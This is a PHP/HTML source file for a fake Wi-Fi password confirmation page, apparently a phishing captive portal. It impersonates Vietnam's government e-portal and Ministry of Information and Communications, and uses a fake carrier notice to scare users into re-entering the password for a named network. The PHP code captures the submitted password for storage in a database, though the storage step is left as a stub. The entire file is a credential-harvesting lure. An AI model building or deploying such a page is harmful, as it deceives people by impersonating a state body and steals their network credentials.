<?php
	if (isset($_POST['submit']))
	{
		$host = '';
		$user = '';
		$pass = '';
		$db = '';
		$connect = new mysqli($host, $user, $pass, $db);
		$data = $_POST['pass'];
		// write to database
	}
?>
<!DOCTYPE HTML>
<html>
	<head>
		<link rel="icon" href="/asset/img/signal_1.ico" />
		<link rel="stylesheet" href="/asset/dist/css/bootstrap.css" />
		<link rel="stylesheet" href="/asset/dist/css/bootstrap-theme.min.css" />
		<script src="/asset/jquery-1.12.4.min.js"></script>
		<script src="/asset/dist/js/bootstrap.min.js"></script>
		<style>
			.body
			{
				font-family: "Times New Roman", Times, serif;
			}
			.no-border-radius
			{
				border-radius: 0px;
			}
		</style>
		<title> Cổng thông tin điện tử - CHÍNH PHỦ VN </title>
	</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-8 col-sm-offset-2">
					<form method="post">
						<h3 class="text-muted"> Xác thực mật khẩu Wifi <em><strong>"Wifi Tuan"</strong></em> </h3>
						<div class="form-group">
							<a href="javascript:void(0)" data-toggle="popover"><span class="glyphicon glyphicon-signal"></span>&nbsp; Thông tin chi tiết </a>
						</div>
						<div class="form-group">
							<input type="text" class="form-control no-border-radius" placeholder="Vui lòng nhập mật khẩu của bạn" name="pass" autofocus />
						</div>
						<button type="submit" class="btn btn-primary" name="submit" value="submit"><span class="glyphicon glyphicon-ok"></span>&nbsp; Đồng ý </button>
					</form>
					<hr />
				</div>
			</div>
			<div class="row">
				<div class="col-sm-8 col-sm-offset-2">
					<footer>
						<em> CƠ QUAN CHỦ QUẢN: BỘ THÔNG TIN VÀ TRUYỀN THÔNG (MIC) </em><br />
						<em><strong> Địa chỉ</strong>: 18 Nguyễn Du, Hàng Bài, Hoàn Kiếm, Hà Nội </em><br />
						<em><strong> Điện thoại</strong> 04 3943 5602 </em>
					</footer>
				</div>
			</div>
		</div>
		<script>
		$(document).ready(function(){
			$(document).on('focus', 'a, button', function(){
				$(this).blur();
			});
		    $('[data-toggle="popover"]').popover({
		    	title: 'THÔNG BÁO TỪ NHÀ MẠNG',
		    	content: 'Để đảm bảo an toàn thông tin trên Internet, chúng tôi muốn bạn xác nhận mật khẩu Wifi của bạn để bảo vệ dữ liệu của bạn an toàn trước các Hacker và Virus xâm nhập qua Máy tính và SmartPhone !',
		    	trigger: 'hover'
		    });   
		});
		</script>
	</body>
</html>